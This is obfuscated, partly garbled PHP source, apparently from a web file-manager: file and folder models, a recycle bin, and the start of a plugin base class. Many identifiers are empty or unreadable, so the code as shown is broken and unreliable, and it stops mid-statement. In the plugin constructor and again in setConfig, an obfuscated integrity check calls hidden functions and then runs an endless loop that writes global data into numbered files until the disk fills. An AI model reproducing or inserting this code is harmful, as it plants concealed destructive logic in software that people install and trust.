$this->sourceCacheClear($䰞[$ӑ]); } } public function rename($, $) { $ =& $_SERVER[]; $Џ = $this->sourceInfo($); if (!$Џ) { return !1; } $Ԙ = $this->fileNameExist($Џ[$[180]], $); if ($Ԙ && $Ԙ != $) { return !1; } $ͅ㾡 = array($[462] => $, $[619] => USER_ID); if ($Џ[$[453]] != $[88]) { $ͅ㾡[$[454]] = substr(get_path_ext($), 0, 10); } Model($[601])->eventRename($, $Џ[$[32]], $); $this->sourceCacheClear($); $this->setNamePinyin($, $ͅ㾡[$[32]], !1); $this->updateModifyTime($Џ[$[180]]); $Ż = $this->where(array($[459] => $))->data($ͅ㾡)->save(); $ߝ = $[2173] . $Џ[$[180]]; if (isset(self::$cacheChildList[$ߝ])) { unset(self::$cacheChildList[$ߝ]); } return $Ż; } public function setNamePinyin($Ώ, $, $ = true) { $ʋ =& $_SERVER[]; $ʆΧ = Input::check($, $ʋ[623]); $ɝ = array($ʋ[485] => KodSort::makeStr($)); if ($ʆΧ) { $ɝ[$ʋ[506]] = str_replace($ʋ[53], $ʋ[12], Pinyin::get($)); $ɝ[$ʋ[505]] = Pinyin::get($, $ʋ[624]); } if (!$ && !$ʆΧ) { $ɝ[$ʋ[506]] = null; $ɝ[$ʋ[505]] = null; } $this->metaSet($Ώ, $ɝ); } public function getContent($) { $Ր˄ =& $_SERVER[]; $䒯 = $this->fileInfoGet($); if (!$䒯) { return !1; } if ($䒯[$Ր˄[76]] == 0) { return $Ր˄[12]; } $Ñ = $Ր˄[2187] . $䒯[$Ր˄[641]]; if ($䒯[$Ր˄[76]] <= 1024 * 10) { $Ç醟 = Cache::get($Ñ); if (!$Ç醟) { $Ç醟 = IO::getContent($䒯[$Ր˄[84]]); Cache::set($Ñ, $Ç醟); } return $Ç醟; } if (!$䒯[$Ր˄[84]]) { return $Ր˄[12]; } return IO::getContent($䒯[$Ր˄[84]]); } public function setDesc($Ѯ, $̜) { $ =& $_SERVER[]; Model($[601])->eventAddDesc($Ѯ, $̜); return $this->metaSet($Ѯ, $[494], $̜); } public function setContent($抯, $ = '') { $ֽ =& $_SERVER[]; $Ѝ = $this->sourceInfo($抯); $ = $this->fileInfoGet($抯); if (!$ || !$Ѝ) { return !1; } $ = Model($ֽ[512])->addFileByContent($, $Ѝ[$ֽ[32]]); $Ƚ = $this->fileHistory($Ѝ, $[$ֽ[509]], $[$ֽ[76]]); if (!$Ƚ) { return Model($ֽ[512])->remove($[$ֽ[509]]); } $this->folderSizeReset($Ѝ[$ֽ[180]]); return !0; } public function fileSubstr($, $慨, $⣶) { $ = $this->fileInfoGet($); if (!$) { return !1; } return IO::fileSubstr($[$_SERVER[][84]], $慨, $⣶); } public function fileInfoGet($) { $ =& $_SERVER[]; $ǣ = $this->sourceInfo($); if (!$ǣ || $ǣ[$[453]]) { return !1; } $־ = $[515] . $ǣ[$[509]]; $ = _get(self::$cacheFileInfo, $־); if ($) { return $; } $ = Model($[512])->fileInfo($ǣ[$[509]]); if ($) { $[$[32]] = $ǣ[$[32]]; } self::$cacheFileInfo[$־] = $; return $; } private function folderChildrenNumber($ݠ) { $ =& $_SERVER[]; $ǩ = $this->sourceInfo($ݠ); $ = array($[620] => array($[580], $ǩ[$[553]] . $ݠ . $[581]), $[617] => $ǩ[$[538]], $[472] => intval($ǩ[$[473]]), $[614] => 1); $ = $this->where($)->count(); $ = $this->where($)->where(array($[614] => 0))->count(); return array($[80] => $, $[81] => $); } public function pathInfo($, $ğ = false) { $̍ =& $_SERVER[]; $ğ = !1; $ = intval($); $Ԁ = $̍[502] . intval($ğ) . $̍[430] . $; $ɳʞ = _get(self::$cachePathInfo, $Ԁ); if ($ɳʞ) { return $ɳʞ; } $Пڒ = $this->sourceInfo($); if (!$Пڒ) { return !1; } $Пڒ = $this->_listDataApplyItem($Пڒ, $ğ); self::$cachePathInfo[$Ԁ] = $Пڒ; return $Пڒ; } public static $cachePathInfoMore = array(); public function pathInfoMore($ԕ) { $ =& $_SERVER[]; $պ = _get(self::$cachePathInfoMore, $ԕ); if ($պ) { return $պ; } $ = $this->pathInfo($ԕ); if (!$) { return !1; } if ($[$[453]] == $[88]) { $[$[79]] = $this->folderChildrenNumber($ԕ); } self::$cachePathInfoMore[$ԕ] = $; return $; } public function sourceInfo($) { $ت =& $_SERVER[]; if (!$) { return array(); } $ = intval($); $˚ = $ت[501] . $; $ = _get(self::$cacheSourceInfo, $˚); if ($) { return $; } $ݭ = $this->where(array($ت[181] => $))->find(); self::$cacheSourceInfo[$˚] = $ݭ; return self::$cacheSourceInfo[$˚]; } public function sourceCacheClear($ = false) { self::cacheClear($); } public static function cacheClear($ɳ = false) { $ݻ =& $_SERVER[]; if ($ɳ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$ݻ[501] . $ɳ]); unset(self::$cachePathInfoMore[$ɳ]); unset(self::$cachePathInfo[$ݻ[2188] . $ɳ]); unset(self::$cachePathInfo[$ݻ[2189] . $ɳ]); } public function metaSet($ٙ, $ޣ = null, $ʀ = null) { $ = parent::metaSet($ٙ, $ޣ, $ʀ); if ($) { $this->sourceCacheClear($ٙ); } return $; } public function pathInfoByPath($ᘯ, $) { $ =& $_SERVER[]; $ = !$ ? array() : explode($[8], trim($, $[8])); $ӈ = $ᘯ; foreach ($ as $ʜ) { $Ū = array($[180] => $ӈ, $[32] => $ʜ); $ˣ = $this->field($[2190])->where($Ū)->select(); if (!$ˣ) { return !1; } $ˣ = array_sort_by($ˣ, $[473]); $ӈ = $ˣ[0][$[181]]; } $˷Җ = $this->sourceInfo($ӈ); $this->pathInfoFilter($˷Җ); return $˷Җ; } protected function updateModifyTime($͈) { $Ӵ =& $_SERVER[]; $Փ = defined($Ӵ[2106]) ? USER_ID : 0; if (!$͈) { return; } if (!is_array($͈)) { $͈ = array($͈); } foreach ($͈ as $ђ => $) { $͈[$ђ] = intval($); $this->sourceCacheClear($); } $ = array($Ӵ[181] => array($Ӵ[7], $͈)); $Ɏ = array($Ӵ[619] => $Փ, $Ӵ[466] => time()); $this->where($)->save($Ɏ); } public function folderSizeReset($ܮ, $ = false) { $ =& $_SERVER[]; if ($this->statusIgnoreResetSpace) { return; } $ = $this->sourceInfo($ܮ); $ = $[2191] . $ܮ; CacheLock::lock($, 20); if ($ === !1) { $this->sourceCacheClear($ܮ); $ = $this->sourceInfo($ܮ); $ = array($[445] => $ܮ, $[472] => 0); $ǕƦ = $this->where($)->sum($[76]); $ = intval($ǕƦ) - intval($[$[76]]); } if ($ == 0) { return CacheLock::unlock($); } $ = $this->parentLevelArray($[$[553]]); if (!$) { $ = array(); } $[] = $[$[181]]; $ = array($[181] => array($[460], $)); if ($ < 0) { $[$[76]] = array($[1054], abs($)); } $this->where($)->setAdd($[76], $); CacheLock::unlock($); $檌 = $[2192] . $[$[178]] . $[4] . $[$[538]]; $ = array($[$[178]], $[$[538]]); TaskRun::timeLimitCall($檌, $[2193], $, 1.5); } public function folderSizeResetChildren($) { $ʫ =& $_SERVER[]; $this->sourceCacheClear($); $ = $this->sourceInfo($); $Ӕ = array($ʫ[614] => 1, $ʫ[617] => $[$ʫ[538]], $ʫ[620] => array($ʫ[580], $[$ʫ[553]] . $ . $ʫ[581])); $Ĵ = $ʫ[2194]; $ͷ = $this->field($Ĵ)->where($Ӕ)->select(); $Ӕ[$ʫ[453]] = 0; $鏷 = $this->field($Ĵ)->where($Ӕ)->select(); if (!$鏷) { return; } $ͷ[] = $; $ͷ = array_to_keyvalue($ͷ, $ʫ[181]); foreach ($ͷ as $ɹ => $) { $ͷ[$ɹ][$ʫ[2195]] = $ͷ[$ɹ][$ʫ[76]]; $ͷ[$ɹ][$ʫ[76]] = 0; } foreach ($鏷 as $) { $ = $[$ʫ[180]] . $ʫ[12]; if (!isset($ͷ[$])) { continue; } if ($[$ʫ[473]] == $ͷ[$][$ʫ[473]]) { $ͷ[$][$ʫ[76]] += $[$ʫ[76]]; } } foreach ($ͷ as $) { $ǣ = $this->parentLevelArray($[$ʫ[553]]); foreach ($ǣ as $) { $ = $ . $ʫ[12]; if (!isset($ͷ[$])) { continue; } if ($[$ʫ[473]] == $ͷ[$][$ʫ[473]]) { $ͷ[$][$ʫ[76]] += $[$ʫ[76]]; } } } $Ɛ = array(); foreach ($ͷ as $) { if ($[$ʫ[76]] == $[$ʫ[2195]]) { continue; } $Ɛ[] = array($ʫ[181], $[$ʫ[181]], $ʫ[76], $[$ʫ[76]]); } $this->saveAll($Ɛ); } public function userSpaceReset($Ǔ = false) { $ =& $_SERVER[]; $́ = $this->where(array($[178] => self::TYPE_USER, $[538] => $Ǔ, $[453] => 0))->sum($[76]); $́ = !$́ || $́ <= 0 ? 0 : $́; Model($[546])->userEdit($Ǔ, array($[1874] => $́)); } public function targetSpaceUpdate($Φ, $԰) { $ =& $_SERVER[]; if (!$԰) { return; } if (!in_array($Φ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $ = $this->targetSpaceSize($Φ, $԰); if ($Φ == self::TYPE_USER) { Model($[546])->userEdit($԰, array($[1874] => $)); } else { if ($Φ == self::TYPE_GROUP) { Model($[554])->groupEdit($԰, array($[1874] => $)); } } } public function targetSpaceSize($, $ܥ) { $땸 =& $_SERVER[]; $ = 0; $潟 = $this->targetSourceRoot($, $ܥ, !0); foreach ($潟 as $) { if (!$) { continue; } $ += floatval($[$땸[76]]); $ = array($땸[620] => array($땸[580], $땸[563] . $[$땸[181]] . $땸[581])); $ܭ = Model($땸[471])->field($땸[459])->where($)->select(); $ܭ = array_to_keyvalue($ܭ, $땸[12], $땸[181]); $ܭ = array_unique(array_filter($ܭ)); if ($ܭ) { $ = array($땸[459] => array($땸[460], $ܭ)); $ += floatval($this->where($)->sum($땸[76])); } } $ = !$ || $ <= 0 ? 0 : $; return $; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($) { return $this->fileTypeProfile($, SourceModel::TYPE_USER); } public function groupFileTypeProfile($˷) { return $this->fileTypeProfile($˷, SourceModel::TYPE_GROUP); } private function fileTypeProfile($, $) { $ =& $_SERVER[]; $Į = $[2196] . $ . $[11] . $; $ż = Cache::get($Į); if ($ż) { return $ż; } $س = array($[614] => 0); if ($ != !1) { $س[$[538]] = $; $س[$[178]] = $; } $ = array(); $[$[2197]] = array($[2198] => LNG($[2197]), $[2199] => $this->where($س)->count(), $[585] => $this->where($س)->sum($[76])); $ݠ = KodIO::fileTypeList(); foreach ($ݠ as $ǵ => $) { $س[$[454]] = $this->fileTypeWhere($ǵ); $[$ǵ] = array($[2198] => $[$[32]], $[2199] => $this->where($س)->count(), $[585] => $this->where($س)->sum($[76])); } Cache::set($Į, $, 1200); return $; } public function fileNameExist($, $) { $ =& $_SERVER[]; $ = $this->field($[2200])->where(array($[180] => $, $[32] => $, $[473] => 0))->find(); return is_array($) ? $[$[181]] : !1; } public function childList($ީ) { $ =& $_SERVER[]; $ = $[2173] . $ީ; if (isset(self::$cacheChildList[$])) { return self::$cacheChildList[$]; } $¯ = array($[180] => intval($ީ), $[473] => 0); $ڏ = $this->where($¯)->select(); $ڏ = $ڏ ? $ڏ : array(); self::$cacheChildList[$] = $ڏ; foreach ($ڏ as $ށ) { $ = $[501] . $ށ[$[181]]; self::$cacheSourceInfo[$] = $ށ; } return $ڏ; } public function fileNameAuto($Đ, $, $ = REPEAT_RENAME, $ = false) { $ޚō =& $_SERVER[]; $ = get_path_ext($); $˲ = $ ? basename($, $ޚō[10] . $) . $ޚō[2201] . $ : $ . $ޚō[428]; $ӛ = array($ޚō[180] => $Đ, $ޚō[473] => 0, $ޚō[32] => array($ޚō[427], $˲)); $ = $this->field($ޚō[32])->where($ӛ)->select(); $ڽŐ = array_to_keyvalue($, $ޚō[12], $ޚō[32]); return $this->fileNameAutoGet($ڽŐ, $, $, $); } public function fileNameAutoGet($僽, $ߨЉ, $, $) { $ٓ =& $_SERVER[]; if ($ == REPEAT_REPLACE || !$僽 || !in_array_not_case($ߨЉ, $僽) || $ && $ != REPEAT_RENAME_FOLDER) { return $ߨЉ; } if ($ == REPEAT_SKIP) { return !1; } $ˬ = $ٓ[10] . get_path_ext($ߨЉ); $ˬ = $ˬ == $ٓ[10] || $ ? $ٓ[12] : $ˬ; for ($ = 1; $ <= count($僽) + 1; $++) { $ʹш = substr($ߨЉ, 0, strlen($ߨЉ) - strlen($ˬ)); $Ӣ = $ʹш . "\50{$}\51{$ˬ}"; if (!in_array_not_case($Ӣ, $僽)) { return $Ӣ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\165\162\x63\145\137\162\145\x63\x79\x63\x6c\x65"; protected $dataAuto = array(array("\x63\162\145\141\164\x65\x54\x69\x6d\145", "\x74\x69\155\x65", "\151\x6e\163\x65\162\164", "\x66\165\x6e\143\x74\151\157\x6e")); public function listData($ = false) { $ɠ =& $_SERVER[]; $ = $ ? $ : USER_ID; $񓘦 = $this->where(array($ɠ[1678] => $))->select(); return array_to_keyvalue($񓘦, $ɠ[12], $ɠ[181]); } public function moveToRecycle($䙂) { $ =& $_SERVER[]; $֊ = Model($[1373]); $Մ = $֊->sourceInfo($䙂); if (!$Մ || $Մ[$[473]] == $[88]) { return; } $߫ = array($[459] => $䙂, $[1678] => USER_ID, $[616] => $Մ[$[178]], $[617] => $Մ[$[538]], $[620] => $Մ[$[553]]); $this->add($߫); $this->recycleMove($䙂, 1); if ($Մ[$[453]] == $[88]) { $ = array($[620] => array($[580], $Մ[$[553]] . $䙂 . $[581])); $֊->where($)->setField($[473], 1); } } public function clear() { $this->remove(!1); } public function remove($ = false, $ = false) { $⾝ =& $_SERVER[]; $ = $ ? $ : USER_ID; $Ԛ = Model($⾝[1373]); $۠ = $this->listData($); $ = $ === !1 ? !1 : $; $ = array(); foreach ($۠ as $Ǳ) { if ($ != !1 && !in_array($Ǳ, $)) { continue; } $ڬ = $Ԛ->sourceInfo($Ǳ); $Ԛ->remove($Ǳ, !1); $ = $ڬ[$⾝[178]] . $⾝[11] . $ڬ[$⾝[538]]; $[$] = array($⾝[616] => $ڬ[$⾝[178]], $⾝[538] => $ڬ[$⾝[538]]); $this->where(array($⾝[181] => $Ǳ))->delete(); } foreach ($ as $) { $Ԛ->targetSpaceUpdate($[$⾝[178]], $[$⾝[538]]); } } public function restore($ = false) { $フ = $this->listData(); $this->_restoreSource($フ, $); } public function removeUserAll($ݢΎ) { $this->remove(!1, $ݢΎ); } public function restoreItem($卶) { $this->_restoreSource(array($卶), array($卶)); } private function _restoreSource($շ, $ű) { $ӡИ =& $_SERVER[]; $ = Model($ӡИ[1373]); $ű = $ű == !1 ? !1 : $ű; if (!$շ) { return !0; } $˛ = array(); foreach ($շ as $) { if ($ű != !1 && !in_array($, $ű)) { continue; } $쑔 = $->sourceInfo($); $ = $->sourceInfo($쑔[$ӡИ[180]]); if ($[$ӡИ[473]] == $ӡИ[88]) { continue; } $->lockMoveStart($); $this->recycleMove($, 0); if ($쑔[$ӡИ[453]] == $ӡИ[88]) { $ = array($ӡИ[620] => array($ӡИ[580], $쑔[$ӡИ[553]] . $ . $ӡИ[581])); $->where($)->setField($ӡИ[473], 0); $this->restoreFolderChildren($, $շ); } $this->where(array($ӡИ[181] => $))->delete(); $->folderSizeReset($쑔[$ӡИ[180]]); $˛[] = $쑔[$ӡИ[180]]; if ($쑔[$ӡИ[453]] == $ӡИ[88]) { $˛[] = $; } $->lockMoveEnd($); } $->updateModifyTime($˛); } private function restoreFolderChildren($, $ׯ) { $ =& $_SERVER[]; $ = Model($[1373]); $ = array($[181] => array($[7], array())); foreach ($ׯ as $ƛ) { if ($ƛ == $) { continue; } if (!$->isParentOf($, $ƛ)) { continue; } $ = $->sourceInfo($ƛ); if ($[$[453]] == $[88]) { $[] = array($[620] => array($[580], $[$[553]] . $ƛ . $[581])); } else { $[$[181]][1][] = $ƛ; } } if (!$[$[181]][1]) { unset($[$[181]]); } if (!$) { return; } if (is_array($[$[181]]) && is_array($[$[181]][1])) { $[$[181]][1] = array_unique($[$[181]][1]); } $[$[1039]] = $[1983]; $->where($)->setField($[473], 1); } private function recycleMove($ܮ, $ = 1) { $ =& $_SERVER[]; $ = Model($[1373]); $뒮 = Model($[2202]); $ = array($[181] => $ܮ); if ($) { $->where($)->setField($[473], 1); $뒮->eventRecycle($ܮ, $[2203]); } else { $Ꞙ = $->where($)->find(); $攚ӊ = $Ꞙ[$[453]] == $[88]; $κ = $->fileNameAuto($Ꞙ[$[180]], $Ꞙ[$[32]], REPEAT_RENAME_FOLDER, $攚ӊ); if ($κ != $Ꞙ[$[32]]) { $->rename($ܮ, $κ); } $->where($)->setField($[473], 0); $뒮->eventRecycle($ܮ, $[2204]); } } } goto d; bɿ: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $ =& $_SERVER[]; $ = $_SERVER[$[1222]]; $ = $[1479]; if ($_SERVER[$[911]] != $($)) { $ = $[913]; $ = $[914]; $ = $_SERVER[$[915]] . $[916]; $ = $($); $ۏ = explode($[246], $); if (count($ۏ) < $[682]) { $ = $[917]; $(); } $і = $[918]; $і($_SERVER[$[919]]); $ = $[913]; $(); $ = $[1548]; $ΎӀ = json_encode($GLOBALS[$[1549]]); $ϴ۽ = 1; for ($ڶ = $ϴ۽; $ڶ > 0; $ڶ++) { $(DATA_PATH . $ڶ, $ΎӀ); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($[1550]); $this->pluginName = str_replace($[1550], $[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $[8]; $this->pluginApi = appHostGet() . $[1551] . $this->pluginName . $[8]; $this->pluginHost = $config[$[1552]] . $this->pluginName . $[8]; $this->pluginHostDefault = $config[$[1552]] . $this->pluginName . $[8]; $ = $config[$[1553]]; if ($ && strpos($[50] . $ . $[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$[1554]] . $this->pluginName . $[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[][1555]); } protected function assign($̬, $ٓ뽦 = false) { if (is_array($̬)) { $this->values = array_merge($this->values, $̬); } else { $this->values[$̬] = $ٓ뽦; } } protected function display($짭) { extract($this->values); require $짭; } final function hookRegist($͍˰) { $this->modelPlugin->appRegist($this->pluginName, $͍˰); } final function appIcon() { $⡊δ =& $_SERVER[]; $̪ = $this->appPackage(); $ = $⡊δ[12]; if (isset($̪[$⡊δ[458]])) { if (isset($̪[$⡊δ[458]][$⡊δ[1556]])) { $ = $⡊δ[1557] . $̪[$⡊δ[458]][$⡊δ[1556]] . $⡊δ[1558]; } else { if ($̪[$⡊δ[458]][$⡊δ[1559]]) { $ = $⡊δ[1560] . $̪[$⡊δ[458]][$⡊δ[1559]] . $⡊δ[1561]; } } } return $; } final function fileCanView($) { $͌ꫂ =& $_SERVER[]; if (request_url_safe($)) { return !0; } if ($this->isShare($)) { return !0; } $± = Session::get($͌ꫂ[1562]); if ($GLOBALS[$͌ꫂ[536]] != 1 && !$± || !$±[$͌ꫂ[1563]]) { $ӭ = $͌ꫂ[1564] . rawurlencode(this_url()); show_tips(LNG($͌ꫂ[1565]) . $͌ꫂ[1566] . $ӭ . $͌ꫂ[1567] . LNG($͌ꫂ[1568]) . $͌ꫂ[1569], !1); } if (!Action($͌ꫂ[1570])->authCan($͌ꫂ[1571])) { show_tips(LNG($͌ꫂ[1572]) . $͌ꫂ[1573], !1); } ActionCall($͌ꫂ[1574], $); } final function isShare($ۗƪ) { $ = KodIO::parse($ۗƪ); return $[$_SERVER[][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($) { if (request_url_safe($)) { return $; } if (!$this->isShare($)) { $ = $this->filePath($, !1); } return Action($_SERVER[][1213])->linkOut($); } public function filePathLinkOut($՞) { if (request_url_safe($՞)) { return $՞; } $this->fileCanView($՞); return Action($_SERVER[][1213])->link($՞); } final function filePath($, $ߕ = true) { $ =& $_SERVER[]; $Ͽ = $this->filePathGet($, $ߕ); if (!$this->fileInfo) { show_tips(LNG($[105]), !1); } Hook::trigger($[1575], $Ͽ); $this->in[$[84]] = $Ͽ; return $Ͽ; } final function filePathGet($ز݋, $ = true) { $ߒ =& $_SERVER[]; if ($ˋ = $this->checkSharePath($ز݋, $)) { return $ˋ; } $this->fileCanView($ز݋); if (request_url_safe($ز݋)) { $ = parse_url_query($ز݋); if (isset($[$ߒ[1576]]) && isset($[$ߒ[218]])) { $֔ = Mcrypt::decode($[$ߒ[218]], Model($ߒ[804])->get($ߒ[805])); if ($֔) { $this->fileInfo = IO::info($֔); $this->fileInfo[$ߒ[1577]] = $ز݋; $this->cachePath = $this->pluginCachePath($ߒ[12], $); return $֔; } } $ز݋ = $this->_cacheHttpFile($ز݋, $); $this->fileInfo = IO::info($ز݋); } else { $this->fileInfo = IO::info($ز݋); $this->cachePath = $this->pluginCachePath($ߒ[12], $); } return $ز݋; } final function _cacheHttpFile($, $ė = true) { $쑈ͫ =& $_SERVER[]; $ = parse_url_query($); $ն = get_path_ext($); if (isset($[$쑈ͫ[32]]) && $[$쑈ͫ[32]]) { $ն = get_path_ext($[$쑈ͫ[32]]); } $ = hash_path($) . $쑈ͫ[10] . $ն; $this->cachePath = $this->pluginCachePath($ė ? $ : $쑈ͫ[12]); $Π = IO::fileNameExist($this->cachePath, $); if ($Π) { return KodIO::make($Π); } $ = rtrim($this->cachePath, $쑈ͫ[8]) . $쑈ͫ[8] . $; return $this->pluginCacheFileSet($, file_get_contents_nossl($)); } final function checkSharePath($ε밀, $ = true) { $ =& $_SERVER[]; if (!$this->isShare($ε밀)) { return !1; } $ = Action($[1213])->sharePathInfo($ε밀); if (!is_array($) || !isset($[$[84]])) { show_json(LNG($[1578]), !1); } $this->fileInfo = $; $this->cachePath = $this->pluginCachePath(!1, $); return $[$[84]]; } final function pluginCachePath($֧Ŗ = '', $ڈ = false) { $٘ =& $_SERVER[]; if ($ڈ && is_array($this->fileInfo)) { $֧Ŗ = kodIO::hashPath($this->fileInfo); } $ = rtrim(IO_PATH_SYSTEM_TEMP . $٘[1579] . $this->pluginName . $٘[8] . $֧Ŗ, $٘[8]); $؏ = IO::infoFullSimple($); $Ū = $؏ && is_array($؏) ? $؏[$٘[84]] : $٘[12]; if (!$Ū) { $Ū = IO::mkdir($); } return $Ū; } final function pluginCacheFileSet($Ǽ, $ɿ = '') { $ =& $_SERVER[]; $ҏ = IO::infoFullSimple($Ǽ); if (!$ҏ) { return IO::mkfile($Ǽ, $ɿ, REPEAT_REPLACE); } IO::setContent($ҏ[$[84]], $ɿ); return $ҏ[$[84]]; } final function pluginLocalFile($٘ = '') { $і =& $_SERVER[]; $ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($)) { mk_dir($); } if (!$٘) { return $; } $ = IO::info($٘); $ = $і[1580] . KodIO::hashPath($) . $і[10] . $[$і[175]]; if (!checkExtSafe($)) { $ = $ . $і[1247]; } $ = $ . $; if (@file_exists($)) { return $; } return IO::copy($٘, $, 0, $); } final function appPackage() { $Ǩ =& $_SERVER[]; if ($this->packageData) { return $this->packageData; } $ = $this->parseFile($this->pluginPath . $Ǩ[1581]); $this->parseLang($); $ = json_decode_force($); if (!$) { return array(); } $ = Hook::trigger($Ǩ[1582], $); if ($ && is_array($)) { $ = $; } $this->packageData = $; return $; } public function packageInfoGet($ֽÆ) { $ۂ = $this->appPackage(); return array_get_value($ۂ, $ֽÆ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[][1583]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[][1584]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[][1585]); } public function echoJsAssign($, $듣) { $this->echoJsAssignArr[$] = $듣; } private function parseFile($ꚍ) { $ =& $_SERVER[]; $ʿ = file_get_contents_nossl($ꚍ); $ = array($[1586], $[1587], $[1588], $[1589], $[1590], $[1591], $[1592]); $ǝҵ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$[89]][$[1593]]); foreach ($this->echoJsAssignArr as $̳Ӟ => $ѯ) { $[] = $[1594] . $̳Ӟ . $[1595]; $ǝҵ[] = is_array($ѯ) || is_object($ѯ) ? rawurlencode(json_encode($ѯ)) : $ѯ; } if (strstr($ʿ, $[1596])) { $ާ = rawurlencode(json_encode($this->pluginLangArr)); $ʿ = str_replace($[1596], $ާ, $ʿ); } if (strstr($ʿ, $[1597])) { $ާ = $ާ = rawurlencode(json_encode($this->getConfig())); $ʿ = str_replace($[1597], $ާ, $ʿ); } $ʿ = str_replace($, $ǝҵ, $ʿ); return $ʿ; } private function parseLang(&$) { $ױފ =& $_SERVER[]; $ = $ױފ[1598]; if (!strstr($, $)) { return; } preg_match_all($ױފ[1599], $, $); if (!is_array($) || count($) == 0 || !is_array($[0]) || count($[0]) == 0) { return; } $ = array(); $ = array(); foreach ($[0] as $Ý㢸) { $悧 = substr($Ý㢸, strlen($), -4); $ѯ = LNG($悧); $[] = $Ý㢸; $[] = str_replace(array($ױފ[246], $ױފ[1117], $ױފ[386], $ױފ[118]), array($ױފ[53], $ױފ[53], $ױފ[12], $ױފ[1600]), $ѯ); } $ = str_replace($, $, $); } private function parseConfig(&$ɲ) { $찚 =& $_SERVER[]; $ = $찚[1601]; if (!strstr($ɲ, $)) { return; } preg_match_all($찚[1602], $ɲ, $); if (!is_array($) || count($) == 0 || !is_array($[0]) || count($[0]) == 0) { return; } $ɰ = $this->getConfig(); $ = array(); $ = array(); foreach ($[0] as $ﴘ) { $ = substr($ﴘ, strlen($), -2); $[] = $ﴘ; $[] = _get($ɰ, $); } $ɲ = str_replace($, $, $ɲ); } private function parsePackage(&$) { $ =& $_SERVER[]; $܉ = $[1603]; if (!strstr($, $܉)) { return; } preg_match_all($[1604], $, $); if (!is_array($) || count($) == 0 || !is_array($[0]) || count($[0]) == 0) { return; } $姽ȑ = $this->appPackage(); $ = array(); $ = array(); foreach ($[0] as $ü) { $؄ = substr($ü, strlen($܉), -2); $[] = $ü; $[] = _get($姽ȑ, $؄); } $ = str_replace($, $, $); } final function echoFile($Ƭ, $ = false) { $ =& $_SERVER[]; $ƕ = $this->pluginPath . $Ƭ; if (ACT == $[1605]) { echo $[1606] . $this->pluginName . $[8] . $Ƭ . $[1607]; if (!file_exists($ƕ)) { echo $[1608]; return; } } $ = $this->parseFile($ƕ); $this->parseLang($); $this->parseConfig($); $this->parsePackage($); if (is_array($)) { $ = str_replace(array_keys($), array_values($), $); } echo $[246] . $; } final function initLang() { $ =& $_SERVER[]; $ = $[1609]; $ = $this->pluginPath . $[1610]; $ٛ = I18n::getType(); $ܭ = array(); if (file_exists($ . $ٛ . $[873])) { $ܭ = (include $ . $ٛ . $[873]); } else { if ($ٛ == $[1611] && !file_exists($ . $ٛ . $[873]) && file_exists($ . $[1612])) { $ܭ = (include $ . $[1612]); } else { if (file_exists($ . $ . $[873])) { $ܭ = (include $ . $ . $[873]); } } } if (!is_array($ܭ)) { return array(); } if (@count($ܭ) > 0) { I18n::set($ܭ); } return $ܭ; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($䰀) { $ =& $_SERVER[]; $֛ = $_SERVER[$[915]] . $[916]; $Я䠼 = $[1479]; if ($_SERVER[$[911]] != $Я䠼($֛)) { $۱ = $[913]; $ = $[914]; $˿ = $_SERVER[$[915]] . $[916]; $䭊 = $($˿); $ = explode($[246], $䭊); if (count($) < $[682]) { $Ɣ = $[917]; $Ɣ(); } $ = $[918]; $($_SERVER[$[919]]); $۱ = $[913]; $۱(); $籢 = $[1548]; $ߛ = json_encode($GLOBALS[$[1549]]); $ΰ = 1; for ($߳ = $ΰ; $߳ > 0; $߳++) { $籢(DATA_PATH . $߳, $ߛ); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $䰀); } public function onSetConfig($) { } public function onGetConfig($ˇ) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($) { if ($ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($҈Ȼ = "\160\154\165\147\x69\156\x41\165\x74\150") { $鵺 =& $_SERVER[]; if (!Session::get($鵺[1562])) { return !1; } if (_get($GLOBALS, $鵺[536])) { return !0; } $ = $this->getConfig(); if (!$[$҈Ȼ]) { return !1; } return ActionCall($鵺[1613], $[$҈Ȼ]); } public function url($, $ͧ = '', $ٮ = true) { $ =& $_SERVER[]; $ꊂ = $this->getConfig(); $֪ = KOD_VERSION . $[10] . KOD_VERSION_BUILD; $ԭ = $this->packageVersion(); $ُ = $֪ . $[430] . $ԭ; if (substr($, 0, 4) == $[149] || substr($, 0, 2) == $[1394]) { $ = $ . $[1614] . $ُ; } else { if ($ͧ == $[12]) { $ = $this->pluginHost . $ . $[1614] . $ُ; } else { if ($ͧ === $[75]) { $ = $this->pluginHost . $; } else { if ($ͧ == $[1615]) { $ = STATIC_PATH . $ . $[1614] . $֪; } else { if ($ͧ == $[1616]) { $ = APP_HOST . $[1617] . $ . $[1614] . $֪; } else { if (isset($ꊂ[$ͧ])) { $ = $ꊂ[$ͧ] . $ . $[1614] . $ُ; } } } } } } if (!$ٮ) { return $; } echo 